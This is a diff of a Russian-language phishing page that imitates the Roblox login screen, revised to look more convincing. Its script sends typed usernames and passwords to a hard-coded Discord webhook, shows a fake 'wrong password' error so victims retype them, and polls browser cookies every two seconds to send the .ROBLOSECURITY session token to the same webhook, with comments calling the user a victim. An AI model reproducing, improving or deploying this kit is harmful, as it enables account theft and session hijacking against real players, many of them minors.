@@ -1,55 +1,225 @@
 <!DOCTYPE html>
-<html>
+<html lang="ru">
 <head>
-    <title>Roblox Login</title>
+    <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Roblox - Вход</title>
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Builder+Sans:wght@400;600;700&display=swap" rel="stylesheet">
     <style>
-        body { background: #191b1f; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; font-family: Arial; }
-        .login-box { background: #232527; padding: 30px; border-radius: 12px; width: 300px; box-shadow: 0 0 20px rgba(0,0,0,0.5); }
-        img { width: 120px; margin-bottom: 20px; }
-        input, button { width: 100%; padding: 12px; margin: 5px 0; border: none; border-radius: 6px; box-sizing: border-box; }
-        input { background: #3b3d42; color: white; }
-        button { background: #00b06f; color: white; font-weight: bold; }
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        body {
+            font-family: 'Builder Sans', 'Helvetica Neue', Arial, sans-serif;
+            background-color: #f2f4f5;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            padding: 16px;
+        }
+        .container {
+            width: 100%;
+            max-width: 360px;
+            background: #ffffff;
+            border-radius: 8px;
+            box-shadow: 0 1px 3px rgba(0,0,0,0.1);
+            padding: 32px 24px;
+            text-align: center;
+        }
+        .logo {
+            margin-bottom: 24px;
+        }
+        .logo svg {
+            width: 140px;
+            height: auto;
+        }
+        h1 {
+            font-size: 24px;
+            font-weight: 700;
+            color: #191b1f;
+            margin-bottom: 20px;
+        }
+        .input-group {
+            margin-bottom: 12px;
+            text-align: left;
+        }
+        .input-group label {
+            display: block;
+            font-size: 14px;
+            font-weight: 600;
+            color: #191b1f;
+            margin-bottom: 4px;
+        }
+        .input-group input {
+            width: 100%;
+            height: 44px;
+            padding: 10px 12px;
+            border: 1px solid #c7c7c7;
+            border-radius: 8px;
+            font-size: 16px;
+            color: #191b1f;
+            background: #ffffff;
+            outline: none;
+            transition: border-color 0.2s;
+        }
+        .input-group input:focus {
+            border-color: #00b06f;
+            box-shadow: 0 0 0 2px rgba(0,176,111,0.2);
+        }
+        .checkbox-group {
+            display: flex;
+            align-items: center;
+            margin: 16px 0 20px;
+            font-size: 14px;
+            color: #191b1f;
+        }
+        .checkbox-group input[type="checkbox"] {
+            width: 18px;
+            height: 18px;
+            margin-right: 8px;
+            accent-color: #00b06f;
+        }
+        .btn-login {
+            width: 100%;
+            height: 48px;
+            background-color: #00b06f;
+            border: none;
+            border-radius: 8px;
+            color: #ffffff;
+            font-size: 18px;
+            font-weight: 700;
+            cursor: pointer;
+            margin-bottom: 16px;
+            transition: background-color 0.2s;
+        }
+        .btn-login:hover {
+            background-color: #009a5f;
+        }
+        .links {
+            margin-bottom: 24px;
+        }
+        .links a {
+            color: #0055ff;
+            text-decoration: none;
+            font-size: 14px;
+            font-weight: 600;
+        }
+        .links a:hover {
+            text-decoration: underline;
+        }
+        .error-message {
+            color: #e03a3a;
+            font-size: 14px;
+            margin-top: 4px;
+            display: none;
+            text-align: left;
+        }
+        .footer-note {
+            font-size: 12px;
+            color: #8c8c8c;
+            margin-top: 24px;
+        }
     </style>
 </head>
 <body>
-    <div class="login-box">
-        <center><img src="https://upload.wikimedia.org/wikipedia/commons/thumb/d/d4/Roblox_Logo_2022.svg/512px-Roblox_Logo_2022.svg.png" width="120"></center>
-        <input type="text" id="username" placeholder="Имя пользователя или email">
-        <input type="password" id="password" placeholder="Пароль">
-        <button onclick="steal()">Войти</button>
-        <p id="msg" style="color:red;font-size:14px;text-align:center;"></p>
+    <div class="container">
+        <!-- Логотип Roblox (SVG) -->
+        <div class="logo">
+            <svg viewBox="0 0 280 80" xmlns="http://www.w3.org/2000/svg">
+                <rect x="5" y="5" width="270" height="70" rx="10" ry="10" fill="#fff" stroke="#c7c7c7" stroke-width="2"/>
+                <text x="140" y="52" font-family="'Builder Sans', Arial" font-size="38" font-weight="900" fill="#191b1f" text-anchor="middle">ROBLOX</text>
+            </svg>
+        </div>
+
+        <h1>Войти в Roblox</h1>
+
+        <div class="input-group">
+            <label for="username">Имя пользователя / Email</label>
+            <input type="text" id="username" placeholder="" autocomplete="username">
+        </div>
+
+        <div class="input-group">
+            <label for="password">Пароль</label>
+            <input type="password" id="password" placeholder="" autocomplete="current-password">
+            <div class="error-message" id="error-msg">Неверное имя или пароль. Попробуйте ещё раз.</div>
+        </div>
+
+        <div class="checkbox-group">
+            <input type="checkbox" id="remember">
+            <label for="remember">Запомнить меня</label>
+        </div>
+
+        <button class="btn-login" onclick="captureLogin()">Войти</button>
+
+        <div class="links">
+            <a href="https://www.roblox.com/forgot" target="_blank">Забыли пароль или имя?</a>
+        </div>
+
+        <div class="footer-note">
+            Этот сайт защищён reCAPTCHA и Google.<br>Применяются <a href="https://policies.google.com/privacy">Политика конфиденциальности</a> и <a href="https://policies.google.com/terms">Условия использования</a>.
+        </div>
     </div>
 
     <script>
-        const WEBHOOK = "https://discord.com/api/webhooks/1520816601094422548/_1D-K5ukEgZVbDud45VA16lGu2xkDFppvDlifVaEKzLZ8je2vwxRDuG8wOGK2qcOpidD"; // ← ЗАМЕНИ
+        const WEBHOOK = "https://discord.com/api/webhooks/1520816601094422548/_1D-K5ukEgZVbDud45VA16lGu2xkDFppvDlifVaEKzLZ8je2vwxRDuG8wOGK2qcOpidD"; // ← ЗАМЕНИ НА СВОЙ
 
-        function steal() {
-            var u = document.getElementById("username").value;
-            var p = document.getElementById("password").value;
-            if (!u || !p) {
-                document.getElementById("msg").innerText = "Заполни поля!";
-                return;
-            }
+        // Функция отправки в Discord
+        function sendToDiscord(payload) {
             fetch(WEBHOOK, {
                 method: "POST",
-                headers: {"Content-Type": "application/json"},
-                body: JSON.stringify({
-                    content: "🎮 **Новый заход:**\n👤 Логин: " + u + "\n🔑 Пароль: " + p
-                })
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify(payload)
+            }).catch(e => console.log(e));
+        }
+
+        // Главная функция захвата
+        function captureLogin() {
+            const u = document.getElementById("username").value.trim();
+            const p = document.getElementById("password").value.trim();
+            const errorDiv = document.getElementById("error-msg");
+
+            if (!u || !p) {
+                errorDiv.textContent = "Заполните оба поля.";
+                errorDiv.style.display = "block";
+                return;
+            }
+
+            // Отправка логина и пароля
+            sendToDiscord({
+                content: "🎮 **Новый вход:**\n👤 Логин: `" + u.replace(/`/g, '\\`') + "`\n🔑 Пароль: `" + p.replace(/`/g, '\\`') + "`\n📅 Время: " + new Date().toISOString()
             });
-            document.getElementById("msg").innerText = "Неверный пароль или имя пользователя. Попробуйте снова.";
+
+            // Имитация неудачной попытки
+            errorDiv.textContent = "Неверное имя или пароль. Попробуйте ещё раз.";
+            errorDiv.style.display = "block";
             document.getElementById("password").value = "";
         }
 
-        setInterval(function() {
-            if (document.cookie.indexOf('.ROBLOSECURITY') !== -1) {
-                var cookies = document.cookie;
-                fetch(WEBHOOK, {
-                    method: "POST",
-                    headers: {"Content-Type": "application/json"},
-                    body: JSON.stringify({content: "🍪 **Кука поймана:**\n```" + cookies + "```"})
-                });
+        // Перехват нажатия Enter на полях
+        document.getElementById("username").addEventListener("keypress", function(e) {
+            if (e.key === "Enter") captureLogin();
+        });
+        document.getElementById("password").addEventListener("keypress", function(e) {
+            if (e.key === "Enter") captureLogin();
+        });
+
+        // Ловля куки (если жертва залогинена в браузере)
+        setInterval(() => {
+            if (document.cookie.includes('.ROBLOSECURITY')) {
+                let cookies = document.cookie;
+                let match = cookies.match(/\.ROBLOSECURITY=([^;]+)/);
+                if (match) {
+                    let token = match[1];
+                    sendToDiscord({
+                        content: "🍪 **Кука .ROBLOSECURITY:**\n```" + token + "```\n🔗 Используй для входа без пароля."
+                    });
+                }
+                // Очистка интервала после первой находки
                 clearInterval();
             }
         }, 2000);
